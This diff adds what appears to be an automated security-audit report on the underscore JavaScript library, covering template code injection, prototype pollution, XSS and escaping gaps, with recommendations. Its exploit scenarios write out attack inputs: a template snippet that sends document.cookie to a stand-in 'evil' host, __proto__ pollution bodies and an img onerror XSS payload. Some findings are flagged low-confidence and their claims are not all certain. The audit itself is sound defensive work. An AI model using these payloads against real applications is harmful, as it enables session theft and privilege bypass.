@@ -1,0 +1,92 @@
+{
+  "target": "underscore",
+  "scanned_at": "2026-06-12T00:00:00Z",
+  "focus_areas": [
+    "_.template compilation & interpolation (modules/template.js)",
+    "Key-copying helpers / prototype integrity (_createAssigner, invert)",
+    "HTML escaping (_createEscaper, _escapeMap)",
+    "Object path traversal (_.result)",
+    "Recursive data helpers (_flatten, isEqual)"
+  ],
+  "findings": [
+    {
+      "id": "F-001",
+      "file": "modules/template.js",
+      "line": 87,
+      "category": "code-injection",
+      "severity": "HIGH",
+      "confidence": 0.6,
+      "title": "_.template compiles caller-supplied template text to executable code via new Function",
+      "description": "template() builds a function body from the template string (template.js:50-83) and compiles it with `new Function(argument, '_', source)` at line 87. Any `<% ... %>` evaluate block or `<%= ... %>` interpolate block (lines 56-61) is concatenated verbatim into `source`, so the template string is effectively eval'd in the host realm. If any portion of `text` is attacker-controlled, the attacker runs arbitrary JavaScript in the embedding application.",
+      "exploit_scenario": "A web app stores a user-supplied string and later renders it with `_.template(userString)({...})`. The user submits `<% fetch('//evil/?c='+document.cookie) %>`; on render the code executes in the victim's session (browser) or in the server process (Node).",
+      "recommendation": "Never pass untrusted input as the template string. Precompile templates from trusted source at build time. This is a documented design contract (SECURITY.md), so triage may classify it as intended behavior unless an untrusted-input path is shown.",
+      "confidence_reason": "Real and trivially exploitable when untrusted text reaches it, but the library documents it as intended; reachability depends on embedder misuse."
+    },
+    {
+      "id": "F-002",
+      "file": "modules/_createAssigner.js",
+      "line": 13,
+      "category": "prototype-pollution",
+      "severity": "HIGH",
+      "confidence": 0.5,
+      "title": "Prototype pollution via _.extend / _.defaults copying a __proto__ own key",
+      "description": "createAssigner iterates source keys from keysFunc (allKeys for _.extend/_.defaults) and assigns `obj[key] = source[key]` at line 13. When the source is an object parsed from untrusted JSON containing a `__proto__` own-enumerable key, the bracket assignment `obj['__proto__'] = ...` invokes the prototype setter rather than creating an own property, mutating Object.prototype. _.defaults (defaults.js) uses allKeys and the same assigner, so the same path applies.",
+      "exploit_scenario": "Server does `_.defaults(config, JSON.parse(untrustedBody))` where the body is `{\"__proto__\":{\"isAdmin\":true}}`. Every object in the realm now inherits `isAdmin=true`, enabling auth/logic bypass downstream.",
+      "recommendation": "Filter `__proto__`/`constructor`/`prototype` keys before copying, or use a Map / Object.create(null) for untrusted data; document that untrusted keys must be sanitized by the caller.",
+      "confidence_reason": "Pollution is plausible for JSON-parsed sources with __proto__ as an own key; exact behavior depends on runtime and whether keysFunc enumerates __proto__, so medium confidence pending triage."
+    },
+    {
+      "id": "F-003",
+      "file": "modules/invert.js",
+      "line": 8,
+      "category": "prototype-pollution",
+      "severity": "MEDIUM",
+      "confidence": 0.45,
+      "title": "Prototype pollution in _.invert when an attacker-controlled value equals __proto__",
+      "description": "invert() builds `result[obj[_keys[i]]] = _keys[i]` at line 8, using each VALUE of the input object (coerced to string) as a key on the fresh result object. A value of '__proto__' makes the assignment target the prototype setter on result, and a nested/object value can mutate Object.prototype.",
+      "exploit_scenario": "`_.invert(JSON.parse(untrusted))` where untrusted is `{\"x\":\"__proto__\"}` causes `result['__proto__'] = 'x'`; with crafted values an attacker pollutes shared prototype state.",
+      "recommendation": "Skip or sanitize values that resolve to dangerous keys, or build the result with Object.create(null).",
+      "confidence_reason": "Same prototype-setter mechanism as F-002 but requires attacker control over object values and is lower impact; medium-low."
+    },
+    {
+      "id": "F-004",
+      "file": "modules/template.js",
+      "line": 59,
+      "category": "xss",
+      "severity": "MEDIUM",
+      "confidence": 0.4,
+      "title": "Unescaped interpolation delimiter <%= %> emits raw HTML",
+      "description": "The interpolate branch (template.js:59) emits `((__t=(<expr>))==null?'':__t)` with no HTML escaping, unlike the escape branch (line 57) which routes through _.escape. Data interpolated via the default `<%= %>` delimiter is written raw into the output string. If that output is inserted into the DOM and the interpolated value is attacker-controlled, it yields XSS.",
+      "exploit_scenario": "Template `<h1><%= name %></h1>` rendered with `name = '<img src=x onerror=alert(1)>'` produces executable markup that the page then innerHTMLs.",
+      "recommendation": "Use the escaping delimiter `<%- %>` (or _.escape) for any untrusted interpolation; treat `<%= %>` as unsafe-by-default.",
+      "confidence_reason": "Genuine sink but exploitability depends entirely on caller using the wrong delimiter with untrusted data and an HTML sink downstream."
+    },
+    {
+      "id": "F-005",
+      "file": "modules/result.js",
+      "line": 14,
+      "category": "prototype-pollution",
+      "severity": "LOW",
+      "confidence": 0.3,
+      "title": "_.result walks attacker-controlled path including __proto__/constructor",
+      "description": "result() resolves `obj[path[i]]` for each path segment (result.js:14) with no key filtering, and invokes the value if it is a function (line 19). A path containing 'constructor' then 'constructor' can reach the Function constructor on some objects, and prototype properties are readable. This is a read/traverse primitive, not a write, so impact is limited.",
+      "exploit_scenario": "`_.result(obj, untrustedPath)` with a path like ['constructor','constructor'] could surface the Function constructor for further misuse in a gadget chain.",
+      "recommendation": "Reject reserved keys (__proto__, constructor, prototype) in path traversal, or document that paths must be trusted.",
+      "confidence_reason": "Read-only traversal; needs a contrived gadget chain and attacker-controlled path; low likelihood."
+    },
+    {
+      "id": "F-006",
+      "file": "modules/_escapeMap.js",
+      "line": 1,
+      "category": "xss",
+      "severity": "LOW",
+      "confidence": 0.3,
+      "title": "_.escape does not encode the forward slash",
+      "description": "The escape map (_escapeMap.js) covers & < > \" ' and backtick but not '/'. In most HTML contexts this is safe, but in some legacy/attribute contexts unescaped '/' (e.g., '</script>') can contribute to context-breaking. createEscaper (_createEscaper.js:13-16) only replaces mapped characters.",
+      "exploit_scenario": "Output of _.escape placed inside an inline <script> string context could allow '</script>' sequences to break out, depending on the sink.",
+      "recommendation": "Consider encoding '/' as '&#x2F;' for defense-in-depth in script/attribute contexts, or document the supported contexts.",
+      "confidence_reason": "Defense-in-depth only; OWASP-style hardening with no concrete exploit against standard HTML body context."
+    }
+  ],
+  "summary": {"total": 6, "high": 2, "medium": 2, "low": 2, "low_confidence": 2}
+}
